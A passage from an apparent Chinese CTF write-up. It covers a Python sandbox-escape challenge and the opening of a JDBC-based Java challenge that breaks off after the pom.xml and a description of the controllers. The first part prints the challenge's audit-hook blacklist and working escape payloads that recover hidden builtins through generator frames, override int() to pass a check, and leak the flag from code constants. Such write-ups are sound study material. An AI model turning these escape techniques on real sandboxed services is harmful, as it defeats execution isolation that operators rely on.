+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;&lt;codehere&gt;&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    codes.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;__&quot;</span> <span class="keyword">in</span> codes:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;__ bypass!!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">codes+=<span class="string">&quot;\nres=factorization(c)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(codes)</span><br><span class="line"><span class="built_in">locals</span>=&#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;</span>,<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">res=<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blackFunc</span>(<span class="params">oldexit</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">event, args</span>):</span><br><span class="line">        blackList = [<span class="string">&quot;process&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;sys&quot;</span>,<span class="string">&quot;interpreter&quot;</span>,<span class="string">&quot;cpython&quot;</span>,<span class="string">&quot;open&quot;</span>,<span class="string">&quot;compile&quot;</span>,<span class="string">&quot;__new__&quot;</span>,<span class="string">&quot;gc&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> blackList:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;noooooooooo&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                oldexit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;&lt;judgecode&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">sys.addaudithook(blackFunc(os._exit))</span><br><span class="line"><span class="built_in">exec</span>(code,&#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>)</span><br><span class="line"></span><br><span class="line">p=<span class="built_in">int</span>(<span class="built_in">locals</span>[<span class="string">&quot;res&quot;</span>][<span class="number">0</span>])</span><br><span class="line">q=<span class="built_in">int</span>(<span class="built_in">locals</span>[<span class="string">&quot;res&quot;</span>][<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span>(p&gt;<span class="number">1e5</span> <span class="keyword">and</span> q&gt;<span class="number">1e5</span> <span class="keyword">and</span> p*q==<span class="built_in">int</span>(<span class="string">&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Correct!&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>通过我们的代码获取p，q。然后计算p、q是否等于<code>int(&quot;69627....863&quot;)</code></p>
+<p>可以看到这个很有讲究，用<code>int()</code>括住了这个大数。由于int采用的是globals里的int()，所以我们可以通过将int()覆盖成我们的一个函数让它通过</p>
+<p>比如fake_int如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fake_int</span>(<span class="params">i</span>):</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">len</span>(i)&gt; <span class="number">100</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">123123</span>*<span class="number">123123</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">123123</span></span><br></pre></td></tr></table></figure>
+<p>我们的code如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factorization</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">    builtin = frame.f_back.f_back.f_back.f_locals[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]</span><br><span class="line">    length = builtin.<span class="built_in">len</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">my_fakeint</span>(<span class="params">i</span>):</span><br><span class="line">        <span class="keyword">if</span> length(i) &gt; <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123123</span> * <span class="number">123123</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123123</span></span><br><span class="line">    builtin.<span class="built_in">int</span> = my_fakeint</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>返回的字符串1和2经过int判断长度小于100，返回了123123，而大数长度很大，返回的是123123*123123。导致<code>p*q = 这个大数</code></p>
+<h3><span id="回到本题"> 回到本题</span></h3>
+<p>由于这个题的flag存在于runner.py里，(main.py里将flag读取，然后把固定字符替换成了FLAG)</p>
+<p>所以直接将payload这么写，注意由于双下划线被过滤了，记得改一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f() <span class="comment">#生成器</span></span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">    builtin = frame.f_back.f_back.f_back.f_locals[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]</span><br><span class="line">    code = frame.f_back.f_back.f_back.f_code</span><br><span class="line">    <span class="built_in">print</span>(code.co_consts)</span><br><span class="line">func()</span><br></pre></td></tr></table></figure>
+<p>最后一步，因为它检测了输出有没有flag，如果有就会输出这 runtime什么的</p>
+<p>所以我们不能够直接输出flag，而是得慢慢判断，因为返回的内容是一个小括号括住的(忘了叫set还是叫tuple了，总之可以通过下标获取)</p>
+<p>所以可以通过这样的方式来逐步获取flag的位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(code.co_consts[0:x])</span><br></pre></td></tr></table></figure>
+<p>假设第x个输出了runtime什么的，第x-1个正常，那flag就是<code>[x]</code></p>
+<img src="/posts/undefined/18.png" class title="awa">
+<img src="/posts/undefined/19.png" class title="awa">
+<img src="/posts/undefined/20.png" class title="awa">
+<img src="/posts/undefined/21.png" class title="awa">
+<p>这下就能确定flag在第12个位置。观察可以通过<code>code.co_const[11:12]</code>得到一个只含有flag的小括号</p>
+<p>用<code>code.co_const[11:12][0]</code>取出，然后慢慢输出flag即可：</p>
+<img src="/posts/undefined/22.png" class title="awa">
+<img src="/posts/undefined/23.png" class title="awa">
+<p>因为比赛结束环境开不了了，所以只能本地复现了</p>
+<p>如果嫌麻烦可以拿到<code> builtins</code>的str函数把这个tuple变成str：</p>
+<img src="/posts/undefined/24.png" class title="awa">
+<h2><span id="ezjava"> ezjava</span></h2>
+<p>哈哈，没想到是jdbc打sqlite，失策了。死磕mysql的后果是目光呆滞</p>
+<p>后续学习jdbc attack的时候再把这几个数据库的打法整理以下</p>
+<p>jadx反编译jar得到几个点：</p>
+<ul>
+<li>lib里基本上没有能打的链，log4j也是2.13版，甚至把jackson删了（至少打不了是真的</li>
+<li>包名就叫jdbcTest，所以肯定是打jdbc</li>
+</ul>
+<p>pom.xml如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jdbcTest<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>jdbcTest<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>jdbcTest<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring-boot.version</span>&gt;</span>2.3.3.RELEASE<span class="tag">&lt;/<span class="name">spring-boot.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xerial<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sqlite-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.clickhouse<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>clickhouse-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.3.2-patch11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter-params<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.postgresql/postgresql --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.amazon.redshift<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>redshift-jdbc42<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/oracle.jdbc.oracledriver/ojdbc6 --&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring-boot.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.3.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>给了三个数据库，一个mysql，一个pgsql，一个sqlite</p>
+<p>然后看controller</p>
+<p>IndexController没什么好看的，主要看<code>JdbcController</code>，它传了一个jdbcBean对象进去，然后测试其连通性，其他的bean也没什么有意义的东西，定义了几个类的setter方法和getter方法，只有userBean里有readObject方法，但是jdbc很明显不是打这个userbean的</p>
